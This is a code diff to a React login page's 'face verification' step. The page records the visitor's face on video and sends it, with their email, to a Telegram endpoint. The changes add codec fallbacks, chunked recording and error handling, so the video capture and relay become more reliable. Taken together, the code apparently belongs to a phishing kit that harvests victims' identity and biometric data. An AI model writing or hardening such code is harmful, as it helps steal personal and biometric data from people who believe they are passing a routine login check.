@@ -173,36 +173,51 @@ export default function LoginPage() {
     // Start recording video
     if (stream) {
       const chunks: Blob[] = [];
-      const recorder = new MediaRecorder(stream, {
-        mimeType: 'video/webm;codecs=vp8',
-      });
+      
+      // Try different mimeTypes based on browser support
+      let mimeType = 'video/webm';
+      if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) {
+        mimeType = 'video/webm;codecs=vp9';
+      } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8')) {
+        mimeType = 'video/webm;codecs=vp8';
+      } else if (MediaRecorder.isTypeSupported('video/webm')) {
+        mimeType = 'video/webm';
+      }
+      
+      const recorder = new MediaRecorder(stream, { mimeType });
       
       recorder.ondataavailable = (event) => {
-        if (event.data.size > 0) {
+        if (event.data && event.data.size > 0) {
           chunks.push(event.data);
         }
       };
       
       recorder.onstop = async () => {
-        const videoBlob = new Blob(chunks, { type: 'video/webm' });
-        setRecordedChunks(chunks);
-        
-        // Send video to Telegram
-        const formData = new FormData();
-        formData.append('video', videoBlob, 'face-verification.webm');
-        formData.append('email', userEmail);
-        
         try {
-          await fetch('/api/telegram/video', {
+          const videoBlob = new Blob(chunks, { type: mimeType });
+          setRecordedChunks(chunks);
+          
+          // Send video to Telegram
+          const formData = new FormData();
+          formData.append('video', videoBlob, 'face-verification.webm');
+          formData.append('email', userEmail);
+          
+          const response = await fetch('/api/telegram/video', {
             method: 'POST',
             body: formData,
           });
+          
+          if (!response.ok) {
+            throw new Error(`HTTP error! status: ${response.status}`);
+          }
+          
+          console.log('Video sent successfully');
         } catch (error) {
           console.error('Failed to send video:', error);
         }
       };
       
-      recorder.start();
+      recorder.start(100); // Collect data every 100ms
       setMediaRecorder(recorder);
       
       // Auto-progress through directions
@@ -230,7 +245,7 @@ export default function LoginPage() {
               stream.getTracks().forEach(track => track.stop());
             }
             setCurrentStep("complete");
-          }, 2000);
+          }, 3000);
         }, 3000); // 3 seconds for right direction
       }, 3000); // 3 seconds for left direction
     }
